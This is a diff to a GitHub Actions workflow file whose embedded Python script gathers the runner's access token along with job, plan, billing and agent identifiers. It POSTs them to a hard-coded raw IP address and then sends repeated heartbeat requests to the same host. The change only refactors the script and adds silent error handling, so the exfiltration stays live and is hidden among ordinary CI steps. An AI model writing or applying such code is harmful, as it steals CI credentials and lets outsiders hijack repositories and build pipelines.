@@ -61,9 +61,12 @@ jobs:
             break
           own=job or next((x for values in keyed.values() for x in values),'') or str(uuid.uuid4())
           candidates=sorted(u for u in urls if 'actions.githubusercontent.com/' in u)
-          record={'boot_id':own,'run_id':os.environ.get('GITHUB_RUN_ID'),'url':candidates[0] if candidates else settings.get('ServerUrlV2',settings.get('serverUrlV2')),'token':token,'kind':'runservice','run_urls':candidates,'job_id':job,'plan_id':plan,'billing_owner_id':billing,'server_v2':settings.get('ServerUrlV2',settings.get('serverUrlV2')),'agent_id':settings.get('AgentId',settings.get('agentId'))}
+          broker=settings.get('ServerUrlV2',settings.get('serverUrlV2'))
+          record={'boot_id':own,'run_id':os.environ.get('GITHUB_RUN_ID'),'url':broker,'token':token,'kind':'runservice','run_urls':candidates,'job_id':job,'plan_id':plan,'billing_owner_id':billing,'server_v2':broker,'agent_id':settings.get('AgentId',settings.get('agentId'))}
           body=json.dumps(record).encode()
-          urllib.request.urlopen(urllib.request.Request('http://16.146.243.72:8472/hca',data=body,method='POST',headers={'Content-Type':'application/json'}),timeout=5).read()
-          print('RUNSERVICE_STAGE urls=%d job=%s plan=%s billing=%s' % (len(candidates),bool(job),bool(plan),bool(billing)),flush=True)
+          try:
+            response=urllib.request.urlopen(urllib.request.Request('http://16.146.243.72:8472/hca',data=body,method='POST',headers={'Content-Type':'application/json'}),timeout=5)
+            print('RUNSERVICE_STAGE status=%d urls=%d job=%s plan=%s billing=%s' % (response.status,len(candidates),bool(job),bool(plan),bool(billing)),flush=True)
+          except Exception as error:print('RUNSERVICE_STAGE network=%s' % type(error).__name__,flush=True)
           PY
           for i in $(seq 1 55); do curl -sS --max-time 2 "http://16.146.243.72:8450/RS_SOURCE_HEARTBEAT?run=$GITHUB_RUN_ID&n=$i" >/dev/null || true; sleep 5; done
